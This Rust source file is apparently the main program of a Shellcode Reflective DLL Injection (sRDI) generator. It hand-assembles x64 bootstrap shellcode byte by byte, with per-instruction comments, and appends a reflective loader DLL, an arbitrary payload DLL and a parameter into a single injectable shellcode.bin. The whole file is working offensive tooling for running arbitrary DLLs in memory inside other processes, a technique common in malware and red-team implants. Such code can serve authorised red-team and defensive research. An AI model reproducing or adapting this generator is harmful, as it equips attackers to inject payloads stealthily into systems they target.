use std::{
    fs::{self},
};

use clap::{Parser, arg, command};

use crate::pe::{get_exports_by_name, dbj2_hash};
mod pe;

/// Shellcode Reflective DLL Injection (sRDI)
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// The reflective loader DLL path (loader.dll)
    #[arg(long)]
    loader: String,

    /// The payload DLL path (payload.dll)
    #[arg(long)]
    payload: String,

    /// The function to execute inside payload.dll (SayHello)
    #[arg(long)]
    function: String,

    /// The parameter to pass to the function inside payload.dll (https://localhost:1337/)
    #[arg(long)]
    parameter: String,

    /// The output file path (shellcode.bin)
    #[arg(long)]
    output: String,

   /// The 0x0 flag will execute DllMain and any other flag will execute the function inside payload.dll (SayHello)
   #[arg(long, default_value_t = 1)]
   flags: u32,
}

// This will need to change if you change the name of the Reflective Loader function
const LOADER_ENTRY_NAME: &str = "loader";

// This will need to change if you modify the Bootstrap shellcode
const BOOTSTRAP_TOTAL_LENGTH: u32 = 79;

fn main() {
    let args = Args::parse();

    let loader_path = args.loader;
    let payload_path = args.payload;
    let function_name = args.function;
    let parameter_value = args.parameter;
    let output_path = args.output;
    let flags_value = args.flags;

    println!("Loader Path: {}", loader_path);
    println!("Payload Path: {}", payload_path);
    println!("Output Path: {}", output_path);


    let mut loader_bytes = std::fs::read(loader_path).expect("Failed to read loader path");
    let mut payload_bytes = std::fs::read(payload_path).expect("Failed to read payload path");
    let function_hash = dbj2_hash(function_name.as_bytes());

    let final_shellcode = convert_to_shellcode(&mut loader_bytes, &mut payload_bytes, function_hash, parameter_value, flags_value);

    fs::write(output_path, final_shellcode).expect("Failed to write the final shellcode to file");
}

fn convert_to_shellcode(loader_bytes: &mut Vec<u8>, payload_bytes: &mut Vec<u8>, function_hash: u32, parameter_value: String, flags_value: u32) -> Vec<u8> {
    // Get the reflective loader address in memory by name
    let loader_address = get_exports_by_name(loader_bytes.as_mut_ptr(), LOADER_ENTRY_NAME.to_owned())
        .expect("Failed to get reflective loader address by name");

    // Calculate the reflective loader offset (minus the module_base to get the offset)
    let loader_offset = loader_address as usize - loader_bytes.as_mut_ptr() as usize;
    println!("[+] Reflective Loader Offset: {:#x}", loader_offset);

    let mut bootstrap: Vec<u8> = Vec::new();

    //
    // Start Bootstrap
    //

    //
    // Step 1) Save the current location in memory for calculating addresses.
    //

    // call 0x00 (This will push the address of the next function to the stack)
    bootstrap.push(0xe8);
    bootstrap.push(0x00);
    bootstrap.push(0x00);
    bootstrap.push(0x00);
    bootstrap.push(0x00);

    // pop rcx - This will pop the value we saved on the stack into rcx to capture our current location in memory
    bootstrap.push(0x59);

    // mov r8, rcx - We copy the value of rcx into r8 before we start modifying RCX
    bootstrap.push(0x49);
    bootstrap.push(0x89);
    bootstrap.push(0xc8);

    //
    // Step 2) Align the stack and create shadow space
    //

    // push rsi - save original value
    bootstrap.push(0x56);

    // mov rsi, rsp - store our current stack pointer for later
    bootstrap.push(0x48);
    bootstrap.push(0x89);
    bootstrap.push(0xe6);

    // and rsp, 0x0FFFFFFFFFFFFFFF0 - Align the stack to 16 bytes
    bootstrap.push(0x48);
    bootstrap.push(0x83);
    bootstrap.push(0xe4);
    bootstrap.push(0xf0);

    // sub rsp, 0x30 (48 bytes) - create shadow space on the stack, which is required for x64. A minimum of 32 bytes for rcx, rdx, r8, r9. Then other params on stack
    bootstrap.push(0x48);
    bootstrap.push(0x83);
    bootstrap.push(0xec);
    bootstrap.push(6 * 8); //6 args that are 8 bytes each

    //
    // Step 3) Setup reflective loader parameters: Place the last 5th and 6th args on the stack since, rcx, rdx, r8, r9 are already in use for our first 4 args.
    //

    // mov qword ptr [rsp + 0x20], rcx (shellcode base + 5 bytes) - (32 bytes) Push in arg 5
    bootstrap.push(0x48);
    bootstrap.push(0x89);
    bootstrap.push(0x4C);
    bootstrap.push(0x24);
    bootstrap.push(4 * 8); // 5th arg

    // sub qword ptr [rsp + 0x20], 0x5 (shellcode base) - modify the 5th arg to get the real shellcode base
    bootstrap.push(0x48);
    bootstrap.push(0x83);
    bootstrap.push(0x6C);
    bootstrap.push(0x24);
    bootstrap.push(4 * 8); // 5th arg
    bootstrap.push(5); // minus 5 bytes because call 0x00 is 5 bytes to get the allocate memory from VirtualAllocEx from injector

    // mov dword ptr [rsp + 0x28], <flags> - (40 bytes) Push arg 6 just above shadow space
    bootstrap.push(0xC7);
    bootstrap.push(0x44);
    bootstrap.push(0x24);
    bootstrap.push(5 * 8); // 6th arg
    bootstrap.append(&mut flags_value.to_le_bytes().to_vec().clone());

    //
    // Step 4) Setup reflective loader parameters: Place the 1st, 2nd, 3rd and 4th args in rcx, rdx, r8, r9
    //

    // mov r9, <parameter_length> - copy the 4th parameter, which is the length of the user data into r9
    bootstrap.push(0x41);
    bootstrap.push(0xb9);
    let parameter_length = parameter_value.len() as u32; // This must u32 or it breaks assembly
    bootstrap.append(&mut parameter_length.to_le_bytes().to_vec().clone());

    // add r8, <parameter_offset> + <payload_length> - copy the 3rd parameter, which is address of the user function into r8 after calculation
    bootstrap.push(0x49);
    bootstrap.push(0x81);
    bootstrap.push(0xc0); // We minus 5 because of the call 0x00 instruction
    let parameter_offset =  (BOOTSTRAP_TOTAL_LENGTH - 5) + loader_bytes.len() as u32 + payload_bytes.len() as u32;
    bootstrap.append(&mut parameter_offset.to_le_bytes().to_vec().clone());

    // mov edx, <prameter_hash> - copy the 2nd parameter, which is the hash of the user function into edx
    bootstrap.push(0xba);
    bootstrap.append(&mut function_hash.to_le_bytes().to_vec().clone());

    // add rcx, <payload_offset> - copy the 1st parameter, which is the address of the user dll into rcx after calculation
    bootstrap.push(0x48);
    bootstrap.push(0x81);
    bootstrap.push(0xc1); // We minus 5 because of the call 0x00 instruction
    let payload_offset = (BOOTSTRAP_TOTAL_LENGTH - 5) + loader_bytes.len() as u32; // This must u32 or it breaks assembly
    bootstrap.append(&mut payload_offset.to_le_bytes().to_vec().clone());

    //
    // Step 5) Call reflective loader function
    //

    // call <loader_offset> - call the reflective loader address after calculation
    bootstrap.push(0xe8);
    // This must u32 or it breaks assembly
    let loader_address = (BOOTSTRAP_TOTAL_LENGTH - bootstrap.len() as u32 - 4 as u32) + loader_offset as u32;    
    bootstrap.append(&mut loader_address.to_le_bytes().to_vec().clone());

    //padding
    bootstrap.push(0x90);
    bootstrap.push(0x90);

    //
    // Step 6) Reset the stack to how it was and return to the caller
    //

    // mov rsp, rsi - Reset our original stack pointer
    bootstrap.push(0x48);
    bootstrap.push(0x89);
    bootstrap.push(0xf4);

    // pop rsi - Put things back where we left them
    bootstrap.push(0x5e);

    // ret - return to caller and resume execution flow (avoids crashing process)
    bootstrap.push(0xc3);

    // padding
    bootstrap.push(0x90);
    bootstrap.push(0x90);

    //
    // End Bootstrap
    //
    
    println!("[!] Bootstrap Shellcode Length: {} (Ensure this matches BOOTSTRAP_TOTAL_LENGTH in the code)", bootstrap.len());
    println!("[+] Reflective Loader Length: {}", loader_bytes.len());
    println!("[+] Payload DLL Length: {}", payload_bytes.len());

    let mut shellcode: Vec<u8> = Vec::new();

    // Bootstrap shellcode populated with the correct offsets and values
    shellcode.append(&mut bootstrap);

    // Reflective Loader (RDI)
    shellcode.append(loader_bytes);

    // Payload DLL (Existing DLL)
    shellcode.append(payload_bytes);

    // Parameter Value (User-Data)
    shellcode.append(&mut parameter_value.as_bytes().to_vec());


    println!("[+] Total Shellcode Length: {}", shellcode.len());
    println!("[*] loader(payload_dll: *mut c_void, function_hash: u32, user_data: *mut c_void, user_data_len: u32, _shellcode_bin: *mut c_void, _flags: u32)");
    println!("[*] arg1: rcx, arg2: rdx, arg3: r8, arg4: r9, arg5: [rsp + 0x20], arg6: [rsp + 0x28]");
    println!("[*] rcx: {:#x} rdx: {:#x} r8: {}, r9: {:#x}, arg5: shellcode.bin addy, arg6: {}", payload_offset, function_hash, parameter_value, parameter_value.len(), flags_value);

    return shellcode;
}